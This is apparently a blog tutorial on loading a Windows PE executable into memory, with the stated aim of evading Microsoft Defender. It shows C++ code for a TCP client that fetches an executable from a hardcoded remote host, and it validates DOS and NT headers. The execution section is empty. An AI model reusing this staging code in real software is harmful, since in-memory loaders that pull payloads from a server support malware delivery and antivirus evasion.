---
title: Remote Run PE 
layout: post
---

## Intro

Hi , today I will tell you how we can execute PE in memory and how we can bypass defender by using this 

## What is PE ?

PE (Portable Executable) is an executable and object file format used in Windows family operating systems such as Windows NT, Windows 2000, Windows XP, Windows 7, Windows 10, and others.

PE files include executable files (usually with the .exe extension), dynamic libraries (DLLs), and other file types that can be run on the Windows platform. The PE format was introduced in Windows NT and replaced the older NE (New Executable) format used in earlier versions of the operating system.

In brief, a PE file is an executable file format such as .exe (executable programs) and .dll (dynamic libraries) used in Windows operating systems.

You can read more here https://0xrick.github.io/win-internals/pe2/

## How to run PE in memory ?

In order to run a PE file, first of all it must be received, in our case we will receive the file using tcp and store this buffer in memory.

In my example, when connecting to the server, it asks to get the file size to increase the buffer, then the client sends a start command to get the file. After the server sends the file, we save it to the buffer as vector<char>. 

```cpp
    printf("[+] Connecting!\n");

    //Initialize tcp client class 
    TCPClient tcpClient;

    //Receiving buffer
    std::vector<char> recvBuff;
    int iResult;

    //Value to check correct actions
    BOOL bConnResult;
    BOOL bSendResult;

    // Contecting to server
    bConnResult = tcpClient.connectToServer("192.168.222.128", 4443);;
    if (!bConnResult) {
        return CONNECTION_ERROR;
    }

    printf("[+] Connected!\n");
    printf("[+] Send command to get file size!\n");

    // Send to the server to get file size
    bSendResult = tcpClient.sendToServer("GetFileSize");
    if (!bSendResult) {
        return SENDING_ERROR;
    }

    // validation
    iResult = tcpClient.reciveData();
    if (iResult <= 0) {
        return RECIVE_DATE_ERROR;
    }

    // Getting received buffer 
    recvBuff = tcpClient.getBuffer();

    // vector<char> to string 
    std::string sFileLength(recvBuff.begin(), recvBuff.end());
    printf("[+] Received data: %s\n", sFileLength.c_str());

    // str to int 
    int iFileLength = std::stoi(sFileLength);

    // Change the buffer length for the received data  
    tcpClient.setBufLen(iFileLength);

    printf("[+] Send command to load PE!\n");

    //Send to the server for load PE in memory
    bSendResult = tcpClient.sendToServer("start");
    if (!bSendResult) {
        return SENDING_ERROR;
    }

    //We use delay to make sure the server sends the whole file.
    Sleep(1000 * 5);

    // Getting data
    iResult = tcpClient.reciveData();
    if (iResult <= 0 ) {
        return RECIVE_DATE_ERROR;
    }

    // save to our buffer 
    recvBuff = tcpClient.getBuffer();
    printf("[+] Received data: %.*s\n", iResult, recvBuff.data());
```

You can learn more about how my TCPClient class works, I have left comments, for more details you can write to me in Telegram. 

Once we have the file, we move on to the juice itself.

### Execute PE in Memory 

After getting the file, we need to check the correctness of our PE file.
How do we do this? It's simple, we need to get DOS Header and NT Header.

### What is DOS Header ?

DOS-header is a data structure located at the very beginning of a PE file and its first value is the signature sequence MZ (0x4D5A), which serves to identify the file format and determine whether the file is a PE or not

You can read more here https://0xrick.github.io/win-internals/pe3/


What the DOS structure looks like:
```cpp
    typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
        WORD   e_magic;                     // Magic number
        WORD   e_cblp;                      // Bytes on last page of file
        WORD   e_cp;                        // Pages in file
        WORD   e_crlc;                      // Relocations
        WORD   e_cparhdr;                   // Size of header in paragraphs
        WORD   e_minalloc;                  // Minimum extra paragraphs needed
        WORD   e_maxalloc;                  // Maximum extra paragraphs needed
        WORD   e_ss;                        // Initial (relative) SS value
        WORD   e_sp;                        // Initial SP value
        WORD   e_csum;                      // Checksum
        WORD   e_ip;                        // Initial IP value
        WORD   e_cs;                        // Initial (relative) CS value
        WORD   e_lfarlc;                    // File address of relocation table
        WORD   e_ovno;                      // Overlay number
        WORD   e_res[4];                    // Reserved words
        WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
        WORD   e_oeminfo;                   // OEM information; e_oemid specific
        WORD   e_res2[10];                  // Reserved words
        LONG   e_lfanew;                    // Offset to the NT header
    } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

What do we need it for? To get a signature value, to check if PE is correct. 
How do we test this? Like this. 

```cpp
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buff;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Incorrect dos header...\n");
        return false;
    }
```

Once we have the DOS Header , we can now get the NT Header 

### What is NT Header?

NT Header (or NT header) is the part of the PE structure responsible for describing the basic parameters of the executable file in the operating system.

You can read more here https://0xrick.github.io/win-internals/pe4/

This is how the structure looks like for 32 and 64 bit systems:
**32-bit Version:**
```
    typedef struct _IMAGE_NT_HEADERS {
    DWORD                   Signature;
    IMAGE_FILE_HEADER       FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    } IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

```

**64-bit Version:**
```
    typedef struct _IMAGE_NT_HEADERS64 {
        DWORD                   Signature;
        IMAGE_FILE_HEADER       FileHeader;
        IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
```

This structure will also help us to determine the validity of the received PE file 
How can we do that? Here's the code 

```cpp
    PIMAGE_NT_HEADERS lpNtHdr = (PIMAGE_NT_HEADERS)(buff + dosHeader->e_lfanew);
    if (lpNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Incorrect NT signature...\n");
        return false;
    }
```

## Running!







